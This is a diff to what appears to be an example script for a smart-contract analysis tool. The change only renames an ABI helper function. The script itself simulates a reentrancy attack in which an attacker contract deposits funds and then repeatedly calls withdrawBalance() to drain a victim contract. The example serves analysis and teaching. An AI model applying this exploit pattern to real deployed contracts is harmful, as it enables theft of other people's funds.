@@ -94,7 +94,7 @@ exploit_account.set_reentry_reps(2)
 
 print "[+] Setting attack string"
 #'\x9d\x15\xfd\x17'+pack_msb(32)+pack_msb(4)+'\x5f\xd8\xc7\x10',
-reentry_string = ABI.make_function_id('withdrawBalance()')
+reentry_string = ABI.function_selector('withdrawBalance()')
 exploit_account.set_reentry_attack_string(reentry_string)
 
 print "[+] Initial world state"
@@ -110,10 +110,10 @@ contract_account.addToBalance(value=100000000000000000)
 
 
 print "[+] Let attacker deposit some small amount using exploit"
-exploit_account.proxycall(ABI.make_function_id('addToBalance()'), value=100000000000000000)
+exploit_account.proxycall(ABI.function_selector('addToBalance()'), value=100000000000000000)
 
 print "[+] Let attacker extract all using exploit" 
-exploit_account.proxycall(ABI.make_function_id('withdrawBalance()'))
+exploit_account.proxycall(ABI.function_selector('withdrawBalance()'))
 
 print "[+] Let attacker destroy the exploit andprofit" 
 exploit_account.get_money() 
